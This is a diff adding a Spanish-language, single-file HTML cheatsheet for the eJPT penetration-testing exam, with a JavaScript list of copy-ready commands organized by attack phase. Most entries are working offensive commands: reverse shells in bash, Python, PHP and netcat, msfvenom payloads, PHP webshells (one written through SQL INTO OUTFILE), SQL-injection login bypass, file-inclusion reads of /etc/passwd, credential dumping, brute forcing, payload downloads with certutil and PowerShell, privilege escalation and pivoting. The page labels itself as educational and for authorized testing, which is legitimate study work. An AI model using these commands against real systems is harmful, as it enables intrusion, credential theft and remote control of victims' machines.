@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>eJPT cheatsheet</title>
+<style>
+  :root{
+    --bg:#06090c; --bg2:#0a0f14;
+    --panel:#0d141b; --panel-h:#111a23;
+    --line:#17222e; --line-soft:#111922;
+    --fg:#d6e2ea; --dim:#5a6b78; --dimmer:#3a4752;
+    --green:#3fd968; --green-d:#2ba84f; --green-glow:#3fd96822;
+    --cyan:#4dd0e1; --amber:#f0b849; --violet:#a78bfa; --red:#f0787a;
+    --radius:10px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    background:
+      radial-gradient(900px 500px at 15% -5%, #0e2a1a55, transparent 60%),
+      radial-gradient(700px 400px at 100% 0%, #0a1f2a55, transparent 55%),
+      var(--bg);
+    color:var(--fg);
+    font-family:ui-monospace,'SF Mono','DejaVu Sans Mono',Menlo,Consolas,monospace;
+    font-size:14px;line-height:1.5;padding-bottom:5rem;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:960px;margin:0 auto;padding:0 18px}
+
+  /* ---------- cabecera ---------- */
+  header{
+    position:sticky;top:0;z-index:20;
+    background:linear-gradient(180deg, var(--bg) 62%, transparent);
+    padding:20px 0 12px;
+  }
+  .brand{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}
+  .brand .logo{
+    font-size:19px;font-weight:700;letter-spacing:.3px;color:var(--fg);
+  }
+  .brand .logo .prompt{color:var(--green)}
+  .brand .logo .cur{
+    display:inline-block;width:9px;height:17px;background:var(--green);
+    margin-left:3px;transform:translateY(2px);animation:blink 1.1s steps(1) infinite;
+  }
+  @keyframes blink{50%{opacity:0}}
+  .brand .tag{
+    font-size:11px;color:var(--green);border:1px solid var(--green-d);
+    padding:2px 9px;border-radius:20px;background:var(--green-glow);letter-spacing:.5px
+  }
+  .lede{color:var(--dim);font-size:12.5px;margin-top:6px}
+
+  .controls{display:flex;gap:10px;margin-top:16px;flex-wrap:wrap}
+  .field{position:relative;flex:1;min-width:190px}
+  .field.ip{flex:0 0 210px}
+  .field label{
+    position:absolute;left:11px;top:-6px;font-size:10px;letter-spacing:.5px;
+    color:var(--dimmer);background:var(--bg);padding:0 5px;text-transform:uppercase
+  }
+  .field .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--dimmer);font-size:13px}
+  input{
+    width:100%;background:var(--panel);border:1px solid var(--line);
+    color:var(--fg);font-family:inherit;font-size:14px;
+    padding:11px 12px 11px 32px;border-radius:var(--radius);outline:none;transition:.15s
+  }
+  input:focus{border-color:var(--green-d);box-shadow:0 0 0 3px var(--green-glow)}
+  input::placeholder{color:var(--dimmer)}
+  #ip{color:var(--amber);font-weight:600}
+
+  .filters{display:flex;gap:7px;margin-top:14px;flex-wrap:wrap;align-items:center}
+  .chip{
+    background:var(--panel);border:1px solid var(--line);color:var(--dim);
+    font-family:inherit;font-size:11.5px;padding:6px 12px;border-radius:20px;
+    cursor:pointer;transition:.13s;user-select:none;white-space:nowrap;
+    display:flex;align-items:center;gap:6px
+  }
+  .chip .dot{width:6px;height:6px;border-radius:50%;background:currentColor;opacity:.55}
+  .chip:hover{border-color:var(--green-d);color:var(--fg);transform:translateY(-1px)}
+  .chip.on{background:var(--green-glow);border-color:var(--green);color:var(--green)}
+  .chip .n{color:var(--dimmer);font-size:10.5px}
+  .chip.on .n{color:var(--green-d)}
+
+  /* ---------- lista ---------- */
+  .count{color:var(--dimmer);font-size:11.5px;margin:20px 2px 4px;letter-spacing:.3px}
+  .count b{color:var(--green)}
+
+  .group{margin-top:26px}
+  .group-h{
+    display:flex;align-items:center;gap:10px;
+    color:var(--fg);font-size:13px;font-weight:700;letter-spacing:.3px;
+    padding-bottom:9px;margin-bottom:2px;border-bottom:1px solid var(--line);
+  }
+  .group-h .sq{color:var(--green);font-weight:400}
+  .group-h .ine{
+    margin-left:auto;font-size:9.5px;letter-spacing:.6px;color:var(--amber);
+    border:1px solid #4a3a1a;background:#1a140a;padding:2px 8px;border-radius:20px;text-transform:uppercase
+  }
+
+  .cmd{
+    background:var(--panel);border:1px solid var(--line-soft);border-radius:var(--radius);
+    padding:12px 14px;margin-top:9px;transition:.13s;
+  }
+  .cmd:hover{border-color:var(--line);background:var(--panel-h)}
+  .cmd .desc{color:var(--dim);font-size:12px;margin-bottom:8px;display:flex;gap:8px;align-items:center}
+  .cmd .desc .b{color:var(--fg)}
+  .cmd .desc .why{color:var(--dimmer);font-style:italic}
+  .cmd-row{display:flex;align-items:center;gap:12px}
+  .cmd code{
+    flex:1;color:var(--fg);white-space:pre-wrap;word-break:break-word;
+    font-family:inherit;font-size:13.5px;line-height:1.6;
+  }
+  .cmd code .tool{color:var(--cyan);font-weight:600}
+  .cmd code .flag{color:var(--green)}
+  .cmd code .var{color:var(--amber)}
+  .cmd code .str{color:var(--violet)}
+  .cmd code .cmt{color:var(--dimmer);font-style:italic}
+  .copy{
+    flex-shrink:0;background:transparent;border:1px solid var(--line);
+    color:var(--dim);font-family:inherit;font-size:11px;letter-spacing:.3px;
+    padding:6px 12px;border-radius:7px;cursor:pointer;transition:.13s;
+    display:flex;align-items:center;gap:5px
+  }
+  .copy:hover{border-color:var(--green);color:var(--green);background:var(--green-glow)}
+  .copy.done{border-color:var(--green);color:var(--green);background:var(--green-glow)}
+  .copy svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2}
+
+  .empty{color:var(--dim);text-align:center;padding:56px 0;font-size:13px}
+  .empty .p{color:var(--green)}
+
+  footer{
+    color:var(--dimmer);font-size:11px;text-align:center;margin-top:48px;
+    line-height:1.9;border-top:1px solid var(--line-soft);padding-top:20px
+  }
+  footer kbd{
+    background:var(--panel);border:1px solid var(--line);border-radius:4px;
+    padding:1px 6px;color:var(--dim);font-family:inherit;font-size:10.5px
+  }
+  mark{background:var(--green);color:var(--bg);border-radius:2px;padding:0 2px}
+  ::selection{background:var(--green-d);color:var(--bg)}
+
+  @media(max-width:560px){
+    .field.ip{flex:1 1 100%}
+    .brand .logo{font-size:17px}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="brand">
+      <span class="logo"><span class="prompt">~/</span>ejpt-cheatsheet<span class="cur"></span></span>
+    </div>
+    <div class="lede">Pon la IP objetivo una vez y se aplica a todo · busca o filtra por fase · clic para copiar. Todo local, un fichero.</div>
+
+    <div class="controls">
+      <div class="field">
+        <label>buscar</label>
+        <span class="ic">⌕</span>
+        <input id="search" placeholder="nmap, wpscan, pivot, reverse shell, sudo…" autocomplete="off" autofocus>
+      </div>
+      <div class="field ip">
+        <label>IP objetivo</label>
+        <span class="ic">◎</span>
+        <input id="ip" placeholder="10.10.10.10" autocomplete="off">
+      </div>
+    </div>
+    <div class="filters" id="filters"></div>
+  </header>
+
+  <div class="count" id="count"></div>
+  <div id="list"></div>
+
+  <footer>
+    <kbd>/</kbd> buscar · <kbd>esc</kbd> limpiar · la IP se sustituye en cada comando<br>
+    Uso educativo · pentesting autorizado y entornos controlados
+  </footer>
+</div>
+
+<script>
+// fase, descripción, [qué hace], comando({IP})
+const D = [
+  // ===== 1. Descubrimiento de red =====
+  ["discovery","Hosts vivos en la subred","-sn hace solo ping scan, sin escanear puertos: lista qué IPs responden en la /24","nmap -sn 10.10.10.0/24 -oN hosts"],
+  ["discovery","Descubrimiento por ARP","envía peticiones ARP a toda la interfaz local; detecta hosts que ignoran el ping","arp-scan -l"],
+  ["discovery","Hosts vivos con ping del sistema","barrido rápido por si nmap no está a mano","for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i | grep 'bytes from'; done"],
+
+  // ===== 2. Escaneo de puertos =====
+  ["scan","Escaneo completo (tu plantilla)","-p- los 65535 puertos, -sS SYN scan, -sC scripts por defecto, -sV versiones, -Pn sin ping previo","sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn {IP} -oN escaneo"],
+  ["scan","Solo qué puertos están abiertos","escaneo rápido sin versiones para saber primero dónde mirar","nmap -p- --min-rate 5000 -T4 {IP} -oG puertos"],
+  ["scan","Versiones y scripts en puertos concretos","-sVC lanza detección de versión y scripts solo sobre los puertos ya conocidos","nmap -p22,80,445 -sVC {IP} -oN versiones"],
+  ["scan","Escaneo UDP de los más comunes","-sU escanea UDP; ve servicios que el escaneo TCP no detecta (SNMP, TFTP, DNS)","sudo nmap -sU --top-ports 100 {IP}"],
+  ["scan","Guardar en los tres formatos","-oA genera .nmap, .gnmap y .xml de una vez para procesar la salida luego","nmap -p- -sVC {IP} -oA fullscan"],
+  ["scan","Ejecutar scripts NSE de un tipo","lanza los scripts de una categoría (vuln busca vulnerabilidades conocidas)","nmap --script vuln {IP}"],
+
+  // ===== 3. Web =====
+  ["web","Escaneo de vulnerabilidades web","Nikto prueba miles de rutas y fallos conocidos (ficheros peligrosos, versiones vulnerables)","nikto -h http://{IP}"],
+  ["web","Fuzzing de directorios y ficheros","dirb prueba cada palabra del diccionario como ruta para descubrir contenido oculto","dirb http://{IP} /usr/share/wordlists/dirb/common.txt"],
+  ["web","Fuzzing de rutas con ffuf","FUZZ marca dónde se prueba cada palabra; -c colorea la salida","ffuf -u http://{IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c"],
+  ["web","Fuzzing probando extensiones","-e añade cada extensión a cada palabra: busca admin.php, backup.txt, etc.","ffuf -u http://{IP}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak -c"],
+  ["web","Descubrir vhosts por cabecera Host","fuzzea el Host HTTP; -fs 0 oculta respuestas vacías para ver solo los que existen","ffuf -u http://{IP}/ -H 'Host: FUZZ.target' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"],
+  ["web","Identificar la tecnología del sitio","whatweb detecta servidor, CMS, lenguaje y versiones a partir de las respuestas","whatweb http://{IP}"],
+  ["web","Ver solo las cabeceras HTTP","-I pide únicamente las cabeceras: revela servidor, redirecciones y cookies","curl -sI http://{IP}"],
+  ["web","Buscar rutas y comentarios en el HTML","descarga la página y filtra enlaces, recursos y comentarios donde a veces hay pistas","curl -s http://{IP} | grep -iE 'href|src|<!--'"],
+  ["web","Seguir redirecciones y ver el cuerpo","-L sigue los 301/302 para ver dónde acaba realmente la petición","curl -sL http://{IP}"],
+
+  // ===== 4. WordPress =====
+  ["wordpress","Enumerar usuarios y plugins vulnerables","--enumerate u lista usuarios, vp lista plugins con vulnerabilidades conocidas","wpscan --url http://{IP} --enumerate u,vp"],
+  ["wordpress","Enumerar solo los usuarios","saca los nombres de login válidos para después probar contraseñas contra ellos","wpscan --url http://{IP} --enumerate u"],
+  ["wordpress","Fuerza bruta de contraseña","prueba cada contraseña de rockyou contra el usuario indicado vía XML-RPC","wpscan --url http://{IP} --usernames admin --passwords /usr/share/wordlists/rockyou.txt"],
+
+  // ===== 5. SMB / servicios =====
+  ["services","Listar recursos SMB sin credenciales","-N intenta sesión nula (sin login): a veces expone los shares directamente","smbclient -L //{IP}/ -N"],
+  ["services","Comprobar acceso SMB en un host","muestra la versión de SMB y si el host acepta las credenciales dadas","crackmapexec smb {IP}"],
+  ["services","Rociar credenciales por toda la /24","prueba el mismo usuario/contraseña en cada host: detecta reutilización","crackmapexec smb 10.10.10.0/24 -u usuario -p 'password'"],
+  ["services","Listar shares con crackmapexec","--shares muestra a qué recursos da acceso la credencial","crackmapexec smb {IP} -u usuario -p 'password' --shares"],
+  ["services","Enumeración SMB completa","-a lanza todas las comprobaciones: usuarios, grupos, shares y políticas","enum4linux -a {IP}"],
+  ["services","Conectarse a un recurso SMB","abre una sesión al share; dentro se usan 'ls' y 'get fichero' para descargar","smbclient //{IP}/share -N"],
+  ["services","Descargar todo un share recursivo","-R con smbget baja la carpeta entera de golpe","smbget -R smb://{IP}/share"],
+
+  // ===== 6. FTP =====
+  ["ftp","Login anónimo a FTP","muchos FTP permiten usuario 'anonymous' con cualquier contraseña","ftp {IP}"],
+  ["ftp","Descargar un fichero por FTP","dentro de la sesión: 'binary' y luego get","get fichero.txt"],
+  ["ftp","Descargar todo por FTP (wget)","-r recursivo con credenciales anónimas","wget -r ftp://anonymous:anonymous@{IP}/"],
+  ["ftp","Subir un fichero al FTP","útil si el FTP sirve la web (subir webshell)","put shell.php"],
+
+  // ===== 7. DNS =====
+  ["dns","Consulta DNS básica","resuelve un dominio contra el servidor objetivo","dig @{IP} target.dl"],
+  ["dns","Transferencia de zona (AXFR)","si está mal configurada, vuelca todos los registros del dominio","dig @{IP} target.dl axfr"],
+  ["dns","Fuerza bruta de subdominios","prueba nombres de un diccionario contra el DNS","dnsenum --dnsserver {IP} target.dl"],
+  ["dns","Resolución inversa","obtiene el nombre asociado a una IP","dig -x {IP} @{IP}"],
+
+  // ===== 8. Bases de datos =====
+  ["db","Conectar a MySQL","-h host, -u usuario; pedirá la contraseña","mysql -h {IP} -u root -p"],
+  ["db","Conectar a MSSQL","cliente de impacket para SQL Server","impacket-mssqlclient usuario:password@{IP}"],
+  ["db","Enumerar MySQL con nmap","scripts que sacan versión, usuarios y bases de datos","nmap -p3306 --script mysql-* {IP}"],
+  ["db","Comandos SQL básicos de enumeración","dentro del cliente: listar bases, tablas y datos","show databases; use nombre; show tables;"],
+  ["db","Escritura de webshell vía SQL (MySQL)","si hay FILE priv y ruta web escribible","SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php';"],
+
+  // ===== 9. Otros servicios (RDP/LDAP/NFS/SMTP) =====
+  ["other","Conectar por RDP","cliente de escritorio remoto con credenciales","xfreerdp /u:usuario /p:password /v:{IP}"],
+  ["other","Enumerar LDAP","vuelca la información del árbol LDAP sin autenticar","ldapsearch -x -H ldap://{IP} -b 'dc=target,dc=dl'"],
+  ["other","Listar exports NFS","muestra qué carpetas comparte el servidor NFS","showmount -e {IP}"],
+  ["other","Montar un export NFS","monta la carpeta compartida en local para leerla","sudo mount -t nfs {IP}:/ruta /mnt/nfs"],
+  ["other","Enumerar usuarios SMTP (VRFY)","comprueba qué usuarios existen en el servidor de correo","smtp-user-enum -M VRFY -U usuarios.txt -t {IP}"],
+
+  // ===== 10. Búsqueda de exploits =====
+  ["vuln","Buscar exploit por servicio y versión","busca en la base local de Exploit-DB coincidencias para lo que encontraste","searchsploit openfire 4.7"],
+  ["vuln","Copiar un exploit a la carpeta actual","-m descarga una copia editable del exploit por su número de ID","searchsploit -m 12345"],
+  ["vuln","Ver la ruta de un exploit","-p muestra dónde está el fichero para inspeccionarlo antes de usarlo","searchsploit -p 12345"],
+  ["vuln","Buscar solo en títulos","-t evita falsos positivos filtrando por el título del exploit","searchsploit -t wordpress"],
+
+  // ===== 11. Web ofensiva (SQLi / LFI / upload) =====
+  ["webexp","Bypass de login por SQLi","comilla que cierra la consulta y comenta el resto: entra sin contraseña","admin' or '1'='1'-- -"],
+  ["webexp","Detectar y volcar BBDD con sqlmap","--batch responde solo, --dbs lista las bases de datos","sqlmap -u 'http://{IP}/page.php?id=1' --batch --dbs"],
+  ["webexp","Volcar una tabla con sqlmap","-D base -T tabla --dump extrae su contenido (credenciales)","sqlmap -u 'http://{IP}/page.php?id=1' -D app -T users --dump"],
+  ["webexp","sqlmap sobre una petición capturada","-r usa un request guardado de Burp; útil para POST y cabeceras","sqlmap -r request.txt --batch --dbs"],
+  ["webexp","Probar Local File Inclusion","si la web incluye ficheros, lee /etc/passwd subiendo directorios","curl 'http://{IP}/page.php?file=../../../../etc/passwd'"],
+  ["webexp","LFI con wrapper base64","lee el código fuente de un .php sin ejecutarlo","curl 'http://{IP}/page.php?file=php://filter/convert.base64-encode/resource=index.php'"],
+  ["webexp","Webshell mínima en PHP","súbela por un upload o FTP; ejecuta comandos con ?c=","echo '<?php system($_GET[\"c\"]); ?>' > sh.php"],
+  ["webexp","Ejecutar comandos en la webshell","llama al comando por el parámetro c","curl 'http://{IP}/uploads/sh.php?c=id'"],
+
+  // ===== 12. Fuerza bruta =====
+  ["brute","Fuerza bruta SSH","-l usuario fijo, -P lista de contraseñas; prueba cada una contra el SSH","hydra -l usuario -P /usr/share/wordlists/rockyou.txt ssh://{IP}"],
+  ["brute","Fuerza bruta de login web (POST)","^USER^/^PASS^ son los huecos; F= marca el texto que aparece cuando falla el login","hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"],
+  ["brute","Fuerza bruta FTP","-L prueba varios usuarios (lista) contra la lista de contraseñas","hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ftp://{IP}"],
+  ["brute","Fuerza bruta con usuarios y claves","-L y -P a la vez: cruza cada usuario con cada contraseña","hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://{IP}"],
+  ["brute","Fuerza bruta genérica a un servicio","cambia el módulo final (rdp, smb, mysql, ftp…)","hydra -l usuario -P /usr/share/wordlists/rockyou.txt rdp://{IP}"],
+
+  // ===== 13. Cracking de hashes =====
+  ["crack","Identificar el tipo de hash","hashid dice qué algoritmo es antes de crackear","hashid '$1$xyz...'"],
+  ["crack","Crackear con John","usa rockyou; John detecta el formato solo en muchos casos","john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"],
+  ["crack","Ver una contraseña ya crackeada","--show muestra los hashes que John ya resolvió","john --show hash.txt"],
+  ["crack","Crackear con Hashcat","-m el modo del hash, -a 0 ataque de diccionario","hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"],
+  ["crack","Preparar una clave SSH cifrada","convierte la id_rsa a formato crackeable por John","ssh2john id_rsa > id_rsa.hash"],
+  ["crack","Crackear ZIP protegido","saca el hash del zip y lo pasa a John","zip2john fichero.zip > zip.hash"],
+
+  // ===== 14. Metasploit =====
+  ["msf","Abrir la consola de Metasploit","-q arranca sin el banner de inicio","msfconsole -q"],
+  ["msf","Buscar un módulo","filtra los módulos disponibles por nombre de servicio o CVE","search openfire"],
+  ["msf","Cargar un módulo","use selecciona el módulo; a partir de ahí se configuran sus opciones","use exploit/multi/http/openfire_auth_bypass_rce"],
+  ["msf","Ver las opciones de un módulo","lista qué parámetros hay que rellenar (RHOSTS, LHOST, etc.)","options"],
+  ["msf","Fijar el objetivo","RHOSTS es la máquina víctima; LHOST tu IP para las reverse shell","set RHOSTS {IP}"],
+  ["msf","Enumerar usuarios SSH válidos","módulo auxiliar que confirma qué nombres de usuario existen por SSH","use auxiliary/scanner/ssh/ssh_enumusers"],
+  ["msf","Listar sesiones abiertas","muestra las shells conseguidas; -i N entra en una","sessions -l"],
+  ["msf","Mandar la sesión al segundo plano","deja la shell abierta y vuelve a la consola de msf","background"],
+  ["msf","Migrar/subir a Meterpreter","convierte una shell normal en sesión Meterpreter","sessions -u 1"],
+
+  // ===== 15. Generar payloads (msfvenom) =====
+  ["payload","Reverse shell ELF (Linux)","binario que conecta de vuelta a tu LHOST:LPORT","msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT=4444 -f elf -o shell"],
+  ["payload","Reverse shell EXE (Windows)","ejecutable para víctimas Windows","msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT=4444 -f exe -o shell.exe"],
+  ["payload","Webshell PHP con msfvenom","payload PHP para subir a una web","msfvenom -p php/reverse_php LHOST={IP} LPORT=4444 -f raw -o shell.php"],
+  ["payload","Reverse shell en formato WAR","para servidores Tomcat","msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT=4444 -f war -o shell.war"],
+
+  // ===== 16. Acceso / shells =====
+  ["access","Poner un listener de netcat","-l escucha, -v verboso, -n sin DNS, -p el puerto; espera la conexión entrante","nc -lvnp 4444"],
+  ["access","Reverse shell en bash","abre una conexión a tu IP:puerto y redirige la shell por ese socket","bash -i >& /dev/tcp/{IP}/4444 0>&1"],
+  ["access","Reverse shell en python3","útil cuando bash falla: conecta y engancha una /bin/bash con pty","python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{IP}\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"],
+  ["access","Reverse shell en PHP","para webs con ejecución de PHP (subida de fichero, LFI a log…)","php -r '$s=fsockopen(\"{IP}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
+  ["access","Reverse shell con netcat (-e)","si la versión de nc soporta -e ejecuta la shell directamente","nc {IP} 4444 -e /bin/bash"],
+  ["access","Reverse shell con mkfifo","alternativa cuando nc no tiene -e","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} 4444 >/tmp/f"],
+  ["access","Bind shell (la víctima escucha)","cuando no puedes recibir conexiones: te conectas tú a ella","nc {IP} 4444"],
+
+  // ===== 17. Transferencia de archivos =====
+  ["transfer","Servir ficheros por HTTP","levanta un servidor web en el 8000 sobre la carpeta actual","python3 -m http.server 8000"],
+  ["transfer","Descargar con wget","trae un fichero desde tu servidor HTTP a la víctima","wget http://{IP}:8000/linpeas.sh"],
+  ["transfer","Descargar con curl","-o guarda con el nombre indicado","curl http://{IP}:8000/linpeas.sh -o linpeas.sh"],
+  ["transfer","Recibir un fichero con netcat","en tu Kali escuchas y guardas lo que llega","nc -lvnp 9001 > fichero"],
+  ["transfer","Enviar un fichero con netcat","desde la víctima lo mandas a tu listener","nc {IP} 9001 < fichero"],
+  ["transfer","Descargar en Windows (certutil)","binario nativo de Windows para bajar ficheros","certutil -urlcache -f http://{IP}:8000/shell.exe shell.exe"],
+  ["transfer","Descargar en Windows (PowerShell)","IWR baja el fichero sin herramientas extra","powershell -c \"iwr http://{IP}:8000/shell.exe -o shell.exe\""],
+
+  // ===== 18. Estabilizar shell =====
+  ["shell","Convertir la shell en una TTY","pty.spawn da una terminal interactiva de verdad (permite sudo, ssh, nano)","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
+  ["shell","Declarar el tipo de terminal","sin esto fallan clear, less y los editores a pantalla completa","export TERM=xterm"],
+  ["shell","Recuperar flechas y autocompletado","tras Ctrl+Z: pon la terminal en raw y trae la shell de vuelta con fg","stty raw -echo; fg"],
+  ["shell","Ver las dimensiones para ajustar","rows y columns para pasárselos a stty y que no se corte el texto","stty size"],
+  ["shell","TTY con script si no hay python","alternativa para conseguir una pseudo-terminal","script /dev/null -c bash"],
+
+  // ===== 19. Post-explotación =====
+  ["post","Enumeración automática de escalada","linpeas repasa el sistema y resalta en color los vectores de escalada","./linpeas.sh | tee linpeas.out"],
+  ["post","Quién soy y a qué grupos pertenezco","id revela grupos como sudo, docker o lxd que dan escalada","id"],
+  ["post","Ver las interfaces de red","una segunda interfaz (otra red) es la señal de que este host es el pivot","ip a"],
+  ["post","Ver la tabla de rutas","muestra a qué otras subredes puede llegar este host","ip route"],
+  ["post","Puertos en escucha","servicios internos que solo se ven desde dentro de la máquina","ss -tulpn"],
+  ["post","Buscar credenciales en ficheros","-r recursivo, -n con número de línea; rastrea contraseñas en configs y webs","grep -rniE 'password|passwd|secret' /var/www 2>/dev/null"],
+  ["post","Ver el historial de comandos","a menudo hay contraseñas o rutas tecleadas por el usuario","cat ~/.bash_history"],
+  ["post","Leer los usuarios del sistema","/etc/passwd lista las cuentas; busca las que tienen shell","cat /etc/passwd"],
+
+  // ===== 20. Pivoting =====
+  ["pivot","Crear ruta hacia la red interna","autoroute manda por la sesión el tráfico de msf dirigido a esa subred","run autoroute -s 10.10.20.0/24"],
+  ["pivot","Escanear la red interna por la sesión","módulo de portscan que llega a hosts que solo alcanza el pivot","use auxiliary/scanner/portscan/tcp"],
+  ["pivot","Levantar un SOCKS proxy en msf","expone la red interna para herramientas de fuera (vía proxychains)","use auxiliary/server/socks_proxy"],
+  ["pivot","Servidor chisel en tu Kali","--reverse permite que el cliente abra un túnel de vuelta hacia ti","chisel server -p 8000 --reverse"],
+  ["pivot","Cliente chisel en el pivot","R:socks crea un proxy SOCKS inverso que sale por la red interna","chisel client {IP}:8000 R:socks"],
+  ["pivot","Usar el proxy con proxychains","antepone proxychains para que la herramienta salga por el túnel SOCKS","proxychains nmap -sT -Pn 10.10.20.5"],
+  ["pivot","Redirigir un puerto con socat","reenvía tu 8080 al puerto de un host interno inalcanzable directamente","socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80"],
+  ["pivot","Túnel SSH dinámico (SOCKS)","-D abre un proxy SOCKS por la conexión SSH; úsalo con proxychains","ssh -D 1080 usuario@{IP}"],
+  ["pivot","Port forward local por SSH","-L trae un puerto de un host interno a tu localhost","ssh -L 8080:10.10.20.5:80 usuario@{IP}"],
+
+  // ===== 21. Escalada de privilegios (Linux) =====
+  ["privesc","Qué puedo ejecutar como sudo","lista los comandos que el usuario puede correr como root; el vector más rápido","sudo -l"],
+  ["privesc","Buscar binarios SUID","-perm -4000 encuentra binarios que corren como su dueño; crúzalos con GTFOBins","find / -perm -4000 -type f 2>/dev/null"],
+  ["privesc","Buscar capabilities peligrosas","getcap lista permisos especiales (cap_setuid, etc.) que permiten escalar","getcap -r / 2>/dev/null"],
+  ["privesc","Revisar tareas cron","scripts programados que corren como root y quizá puedas modificar","cat /etc/crontab"],
+  ["privesc","Ficheros de root escribibles","ficheros que root ejecuta y tú puedes editar: vector directo","find / -writable -type f 2>/dev/null | grep -v '/proc'"],
+  ["privesc","Escalada vía env con SUID","si env tiene el bit SUID, lanza una shell manteniendo privilegios (-p)","./env /bin/sh -p"],
+  ["privesc","Shell root si bash es SUID","-p conserva el usuario efectivo root en lugar de degradar a tu usuario","bash -p"],
+  ["privesc","Ver versión del kernel","para buscar exploits de kernel si no hay otro vector","uname -a"],
+  ["privesc","Escalada por grupo docker","si estás en el grupo docker, montas la raíz del host como root","docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
+
+  // ===== 22. Escalada de privilegios (Windows) =====
+  ["winpriv","Información del sistema","versión y parches: base para buscar exploits de Windows","systeminfo"],
+  ["winpriv","Ver privilegios del usuario","busca SeImpersonate o SeAssignPrimaryToken (Potato attacks)","whoami /priv"],
+  ["winpriv","Enumeración automática (WinPEAS)","equivalente de linpeas para Windows","winpeas.exe"],
+  ["winpriv","Buscar contraseñas en ficheros","rastreo rápido de credenciales en texto","findstr /si password *.txt *.ini *.config"],
+  ["winpriv","Servicios con ruta sin comillas","unquoted service path: vector de escalada clásico","wmic service get name,pathname,startmode | findstr /i auto"],
+];
+
+const META = {
+  discovery:{n:"descubrimiento",c:"var(--cyan)"},
+  scan:{n:"escaneo de puertos",c:"var(--cyan)"},
+  web:{n:"web",c:"var(--green)"},
+  wordpress:{n:"wordpress",c:"var(--green)"},
+  services:{n:"smb / servicios",c:"var(--green)"},
+  ftp:{n:"ftp",c:"var(--green)"},
+  dns:{n:"dns",c:"var(--green)"},
+  db:{n:"bases de datos",c:"var(--green)"},
+  other:{n:"rdp / ldap / nfs / smtp",c:"var(--green)"},
+  vuln:{n:"exploits",c:"var(--amber)"},
+  webexp:{n:"web ofensiva",c:"var(--amber)"},
+  brute:{n:"fuerza bruta",c:"var(--amber)"},
+  crack:{n:"cracking de hashes",c:"var(--amber)"},
+  msf:{n:"metasploit",c:"var(--amber)"},
+  payload:{n:"payloads (msfvenom)",c:"var(--amber)"},
+  access:{n:"acceso / shells",c:"var(--red)"},
+  transfer:{n:"transferencia de archivos",c:"var(--red)"},
+  shell:{n:"estabilizar shell",c:"var(--red)"},
+  post:{n:"post-explotación",c:"var(--violet)"},
+  pivot:{n:"pivoting",c:"var(--violet)"},
+  privesc:{n:"escalada (linux)",c:"var(--violet)"},
+  winpriv:{n:"escalada (windows)",c:"var(--violet)"},
+};
+const ORDER = Object.keys(META);
+
+let activePhase=null, query="";
+const $=s=>document.querySelector(s);
+const listEl=$("#list"), countEl=$("#count"), filtersEl=$("#filters");
+const searchEl=$("#search"), ipEl=$("#ip");
+
+// chips
+filtersEl.innerHTML = ORDER.map(p=>{
+  const n = D.filter(r=>r[0]===p).length;
+  return `<button class="chip" data-p="${p}" style="--c:${META[p].c}">
+    <span class="dot" style="color:${META[p].c}"></span>${META[p].n} <span class="n">${n}</span></button>`;
+}).join("");
+filtersEl.addEventListener("click",e=>{
+  const b=e.target.closest(".chip"); if(!b)return;
+  const p=b.dataset.p;
+  activePhase=(activePhase===p)?null:p;
+  [...filtersEl.children].forEach(c=>c.classList.toggle("on",c.dataset.p===activePhase));
+  render();
+});
+
+searchEl.addEventListener("input",()=>{query=searchEl.value.toLowerCase().trim();render()});
+ipEl.addEventListener("input",render);
+
+const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
+const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
+
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|rm|mkfifo|echo|put|get|sqlmap)\b/;
+
+function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
+function applyIP(cmd){
+  const ip=ipEl.value.trim()||"{IP}";
+  return cmd.replaceAll("{IP}",ip);
+}
+
